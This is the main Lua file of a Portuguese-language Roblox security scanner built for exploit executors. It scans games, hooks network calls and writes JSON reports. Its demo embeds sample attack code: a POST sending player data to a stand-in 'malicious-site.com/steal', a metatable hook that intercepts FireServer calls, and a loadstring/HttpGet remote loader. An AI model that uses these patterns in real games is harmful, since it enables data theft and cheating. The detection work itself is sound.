--[[
    ╔══════════════════════════════════════════════════════════════╗
    ║                    Scanning-Lua v1.0.0                      ║
    ║          Scanner de Segurança para Roblox                   ║
    ║                                                              ║
    ║  Detecta vulnerabilidades, monitora RemoteEvents,           ║
    ║  analisa scripts e registra atividade de rede.              ║
    ║  Logs salvos em JSON para análise posterior.                 ║
    ║                                                              ║
    ║  Compatível com Wave Executor e outros executors Lua.       ║
    ╚══════════════════════════════════════════════════════════════╝
]]

-- ============================================================
-- Carregar módulos
-- ============================================================
local Config = require("config")
local JSON = require("modules.json")
local Logger = require("modules.logger")
local Filters = require("modules.filters")
local Scanner = require("modules.scanner")
local VulnerabilityDetector = require("modules.vulnerability_detector")
local NetworkMonitor = require("modules.network_monitor")

-- ============================================================
-- Inicialização
-- ============================================================
print("============================================")
print("  Scanning-Lua v" .. Config.VERSION)
print("  Scanner de Segurança para Roblox")
print("============================================")
print("")

-- Criar diretórios de saída (compatível com ambientes que suportam io)
pcall(function()
    os.execute("mkdir -p " .. Config.LOG_DIR)
    os.execute("mkdir -p " .. Config.REPORT_DIR)
end)

-- Inicializar Logger
local logger = Logger.new(Config.Logger, Config.LOG_DIR)
logger:info("MAIN", "Scanning-Lua inicializado", {
    version = Config.VERSION,
    session_id = logger.sessionId,
})

-- Inicializar Filtros
local filters = Filters.new(Config.Filters, logger)
logger:info("MAIN", "Módulo de filtros carregado", {
    patterns_count = #(Config.Filters.SUSPICIOUS_PATTERNS or {}),
    min_severity = Config.Filters.MIN_SEVERITY,
})

-- Inicializar Scanner
local scanner = Scanner.new(Config.Scanner, logger, filters)
logger:info("MAIN", "Scanner inicializado", {
    auto_scan = Config.Scanner.AUTO_SCAN_ENABLED,
    scan_interval = Config.Scanner.AUTO_SCAN_INTERVAL,
})

-- Inicializar Detector de Vulnerabilidades
local vulnDetector = VulnerabilityDetector.new(Config.Vulnerability, logger)
logger:info("MAIN", "Detector de vulnerabilidades carregado")

-- Inicializar Monitor de Rede
local networkMonitor = NetworkMonitor.new(Config.Network, logger)
logger:info("MAIN", "Monitor de rede inicializado")

-- ============================================================
-- ScanningLua API - Interface principal
-- ============================================================
local ScanningLua = {}

--- Executa um scan completo do jogo
--- @param gameInstance table|nil Objeto game do Roblox (usa global 'game' se nil)
--- @return table Resultados do scan
function ScanningLua.fullScan(gameInstance)
    local target = gameInstance or (type(game) == "userdata" and game) or nil

    logger:info("MAIN", "========== SCAN COMPLETO INICIADO ==========")

    -- 1. Instalar hooks de rede
    logger:info("MAIN", "[1/4] Instalando monitor de rede...")
    networkMonitor:installHooks()

    -- 2. Escanear serviços do jogo
    if target then
        logger:info("MAIN", "[2/4] Escaneando serviços do jogo...")
        scanner:scanServices(target)
    else
        logger:warn("MAIN", "[2/4] Objeto 'game' não disponível - scan de serviços ignorado")
    end

    -- 3. Analisar vulnerabilidades nos resultados
    logger:info("MAIN", "[3/4] Analisando vulnerabilidades...")
    vulnDetector:analyzeScanResults(scanner:getResults())

    -- 4. Analisar tráfego de rede
    logger:info("MAIN", "[4/4] Analisando tráfego de rede...")
    local networkAlerts = networkMonitor:analyzeTraffic()

    -- Resumo
    local summary = {
        scan_results = scanner:getSummary(),
        vulnerability_stats = vulnDetector:getStats(),
        network_stats = networkMonitor:getStats(),
        network_alerts = #networkAlerts,
        filter_stats = filters:getStats(),
    }

    logger:info("MAIN", "========== SCAN COMPLETO FINALIZADO ==========", summary)

    -- Salvar resultados automaticamente
    ScanningLua.saveAllResults()

    return summary
end

--- Escaneia código Lua diretamente (sem precisar do ambiente Roblox)
--- @param code string Código Lua a ser analisado
--- @param sourceName string Nome/identificador da origem
--- @return table Resultados da análise
function ScanningLua.scanCode(code, sourceName)
    sourceName = sourceName or "direct_input"

    logger:info("MAIN", string.format("Analisando código: %s (%d caracteres)", sourceName, #code))

    -- Analisar com filtros
    local filterMatches = filters:analyzeCode(code, sourceName)

    -- Detectar vulnerabilidades
    local vulnerabilities = vulnDetector:analyzeFilterResults(filterMatches, sourceName)

    local result = {
        source = sourceName,
        code_length = #code,
        filter_matches = filterMatches,
        match_count = #filterMatches,
        vulnerabilities = vulnerabilities,
        vulnerability_count = #vulnerabilities,
    }

    logger:info("MAIN", string.format(
        "Análise concluída: %d padrões suspeitos, %d vulnerabilidades",
        #filterMatches, #vulnerabilities
    ), result)

    return result
end

--- Monitora uma requisição HTTP
--- @param method string Método HTTP
--- @param url string URL
--- @param headers table|nil Headers
--- @param body string|nil Corpo
--- @return table Entrada de log
function ScanningLua.logHTTPRequest(method, url, headers, body)
    return networkMonitor:logRequest(method, url, headers, body)
end

--- Salva todos os resultados e relatórios
function ScanningLua.saveAllResults()
    local timestamp = os.date("!%Y%m%d_%H%M%S")

    -- Salvar logs
    logger:flush(string.format("%s/scan_log_%s.json", Config.LOG_DIR, timestamp))

    -- Salvar resultados do scanner
    scanner:saveResults(string.format("%s/scan_results_%s.json", Config.REPORT_DIR, timestamp))

    -- Salvar relatório de vulnerabilidades
    vulnDetector:saveReport(string.format("%s/vulnerability_report_%s.json", Config.REPORT_DIR, timestamp))

    -- Salvar dados de rede
    local networkData = networkMonitor:exportJSON()
    local networkFile = io.open(string.format("%s/network_report_%s.json", Config.REPORT_DIR, timestamp), "w")
    if networkFile then
        networkFile:write(networkData)
        networkFile:close()
    end

    logger:info("MAIN", "Todos os resultados salvos com sucesso")
end

--- Retorna relatório de vulnerabilidades
--- @return table Relatório formatado
function ScanningLua.getVulnerabilityReport()
    return vulnDetector:generateReport()
end

--- Retorna estatísticas gerais
--- @return table Estatísticas
function ScanningLua.getStats()
    return {
        scanner = scanner:getSummary(),
        vulnerabilities = vulnDetector:getStats(),
        network = networkMonitor:getStats(),
        filters = filters:getStats(),
        logger = logger:getStats(),
    }
end

--- Reseta todos os módulos
function ScanningLua.reset()
    scanner:reset()
    vulnDetector:reset()
    networkMonitor:reset()
    filters:reset()
    logger:info("MAIN", "Todos os módulos resetados")
end

--- Finaliza o scanner e salva dados pendentes
function ScanningLua.shutdown()
    logger:info("MAIN", "Encerrando Scanning-Lua...")
    ScanningLua.saveAllResults()
    logger:close()
    print("[Scanning-Lua] Encerrado com sucesso.")
end

-- ============================================================
-- Modo de demonstração (quando executado fora do Roblox)
-- ============================================================

--- Executa uma demonstração do scanner com dados simulados
function ScanningLua.runDemo()
    print("")
    print("============================================")
    print("  MODO DEMONSTRAÇÃO")
    print("  Executando com dados simulados")
    print("============================================")
    print("")

    logger:info("DEMO", "Iniciando demonstração do scanner")

    -- Simular análise de código com padrões suspeitos
    local sampleCode1 = [[
        local HttpService = game:GetService("HttpService")
        local data = HttpService:JSONEncode({username = player.Name, coins = 999999})
        local response = syn.request({
            Url = "http://malicious-site.com/steal",
            Method = "POST",
            Body = data
        })
    ]]

    local sampleCode2 = [[
        local mt = getrawmetatable(game)
        local oldNamecall = mt.__namecall
        setrawmetatable(game, {
            __namecall = newcclosure(function(self, ...)
                local method = getnamecallmethod()
                if method == "FireServer" then
                    print("Intercepted:", self.Name)
                end
                return oldNamecall(self, ...)
            end)
        })
    ]]

    local sampleCode3 = [[
        loadstring(game:HttpGet("https://raw.githubusercontent.com/user/repo/main/script.lua"))()
        local env = getgenv()
        env.someGlobal = true
    ]]

    local sampleCodeSafe = [[
        local Players = game:GetService("Players")
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        print("Player loaded:", player.Name)
    ]]

    -- Executar análise
    print("\n--- Analisando Amostra 1: Exfiltração de dados ---")
    local result1 = ScanningLua.scanCode(sampleCode1, "sample_data_exfiltration.lua")

    print("\n--- Analisando Amostra 2: Manipulação de metatable ---")
    local result2 = ScanningLua.scanCode(sampleCode2, "sample_metatable_hook.lua")

    print("\n--- Analisando Amostra 3: Injeção de código ---")
    local result3 = ScanningLua.scanCode(sampleCode3, "sample_code_injection.lua")

    print("\n--- Analisando Amostra 4: Código seguro ---")
    local result4 = ScanningLua.scanCode(sampleCodeSafe, "sample_safe_code.lua")

    -- Simular requisições HTTP
    print("\n--- Simulando requisições HTTP ---")
    ScanningLua.logHTTPRequest("GET", "https://api.roblox.com/users/1", nil, nil)
    ScanningLua.logHTTPRequest("POST", "https://malicious-site.com/steal", nil, '{"data":"stolen"}')
    ScanningLua.logHTTPRequest("GET", "https://pastebin.com/raw/abc123", nil, nil)
    ScanningLua.logHTTPRequest("GET", "https://www.roblox.com/catalog", nil, nil)

    -- Simular scan de instâncias Roblox (mock)
    print("\n--- Simulando scan de instâncias ---")
    local mockGame = {
        Name = "Game",
        ClassName = "DataModel",
        GetFullName = function() return "Game" end,
        GetChildren = function()
            return {
                {
                    Name = "ReplicatedStorage",
                    ClassName = "ReplicatedStorage",
                    GetFullName = function() return "Game.ReplicatedStorage" end,
                    GetChildren = function()
                        return {
                            {
                                Name = "RemoteEvent",
                                ClassName = "RemoteEvent",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.RemoteEvent" end,
                                GetChildren = function() return {} end,
                            },
                            {
                                Name = "FireServerHandler",
                                ClassName = "RemoteEvent",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.FireServerHandler" end,
                                GetChildren = function() return {} end,
                            },
                            {
                                Name = "DataSync",
                                ClassName = "RemoteFunction",
                                Parent = { Name = "ReplicatedStorage" },
                                GetFullName = function() return "Game.ReplicatedStorage.DataSync" end,
                                GetChildren = function() return {} end,
                            },
                        }
                    end,
                },
                {
                    Name = "Workspace",
                    ClassName = "Workspace",
                    GetFullName = function() return "Game.Workspace" end,
                    GetChildren = function()
                        return {
                            {
                                Name = "GameScript",
                                ClassName = "Script",
                                Source = sampleCode1,
                                Enabled = true,
                                GetFullName = function() return "Game.Workspace.GameScript" end,
                                GetChildren = function() return {} end,
                            },
                        }
                    end,
                },
            }
        end,
    }

    scanner:scanInstance(mockGame, 0)

    -- Analisar vulnerabilidades
    vulnDetector:analyzeScanResults(scanner:getResults())

    -- Exibir resumo
    print("\n============================================")
    print("  RESUMO DA DEMONSTRAÇÃO")
    print("============================================")

    local stats = ScanningLua.getStats()
    print(string.format("  Scripts analisados: %d", stats.scanner.scripts_analyzed))
    print(string.format("  RemoteEvents encontrados: %d", stats.scanner.remote_events))
    print(string.format("  RemoteFunctions encontradas: %d", stats.scanner.remote_functions))
    print(string.format("  Itens suspeitos: %d", stats.scanner.suspicious_items))
    print(string.format("  Vulnerabilidades: %d", stats.vulnerabilities.total_detected))
    print(string.format("    - CRITICAL: %d", stats.vulnerabilities.by_severity.CRITICAL))
    print(string.format("    - HIGH: %d", stats.vulnerabilities.by_severity.HIGH))
    print(string.format("    - MEDIUM: %d", stats.vulnerabilities.by_severity.MEDIUM))
    print(string.format("    - LOW: %d", stats.vulnerabilities.by_severity.LOW))
    print(string.format("  Requisições de rede: %d", stats.network.total_requests))
    print(string.format("  Requisições suspeitas: %d", stats.network.suspicious_requests))
    print("")

    -- Salvar resultados
    ScanningLua.saveAllResults()

    -- Exibir relatório de vulnerabilidades
    print("\n--- Relatório de Vulnerabilidades (JSON) ---")
    print(vulnDetector:exportReportJSON())

    print("\n============================================")
    print("  DEMONSTRAÇÃO CONCLUÍDA")
    print("  Verifique os diretórios 'logs/' e 'reports/'")
    print("============================================")

    return stats
end

-- ============================================================
-- Auto-executar demonstração se não estiver no Roblox
-- ============================================================
local isRoblox = pcall(function() return game:GetService("Players") end)

if not isRoblox then
    -- Executar demo quando fora do Roblox
    ScanningLua.runDemo()
else
    -- No Roblox: executar scan completo
    ScanningLua.fullScan()
end

-- Exportar API
return ScanningLua
